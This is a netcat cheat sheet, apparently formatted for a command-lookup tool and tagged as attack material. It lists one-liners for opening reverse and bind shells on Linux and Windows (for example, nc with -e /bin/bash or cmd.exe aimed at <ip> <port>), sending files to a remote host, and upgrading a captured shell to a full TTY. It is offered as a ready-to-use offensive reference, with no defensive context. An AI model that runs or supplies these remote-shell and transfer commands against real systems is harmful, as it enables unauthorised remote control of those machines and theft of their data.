# netcat

% nc, netcat

#plateform/linux #target/remote  #cat/ATTACK/LISTEN-SERVE 

## reverse - linux listener (fixed port)
```
rlwrap -cAr nc -nlvp <port>
```

## reverse - linux listener (random port)
```
rlwrap -cAr nc -lnvr
```

## reverse - windows listener 
```
nc.exe -lnvp <port>
```

## reverse - linux binder
```
nc -np <ip> <port> -e /bin/bash
```

## reverse - windows binder
```
nc.exe <ip> <port> -e cmd.exe
```

## bind - linux listener (fixed port)
```
rlwrap -cAr nc -nlvp <port> -e /bin/bash
```

## bind - linux listener (random port)
```
rlwrap -cAr nc -lnvr -e /bin/bash
```

## bind - windows listener 
```
nc.exe -lnvp <port>  -e cmd.exe
```

## bind - linux binder
```
nc -np <ip> <port>
```

## bind - windows binder
```
nc.exe <ip> <port>
```

## transfer - receiver
#plateform/linux #cat/ATTACK/FILE_TRANSFERT 
```
nc -nlvp <port> > <incomming_file>
```

## transfer - sender
#plateform/linux #cat/ATTACK/FILE_TRANSFERT 
```
nc -nv <ip> <port> < <file_to_send>
```

## full tty (1)  
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

## full tty (2)
```
CTRL+Z
``` 

## full tty (3)
```
stty raw -echo ; fg
```

## full tty (4)
TERM=screen
```
export SHELL=/bin/bash; export TERM=xterm-256color ; stty rows <ROWS|38> cols <COLS|116>; reset
```

## no tty
```
see expect
```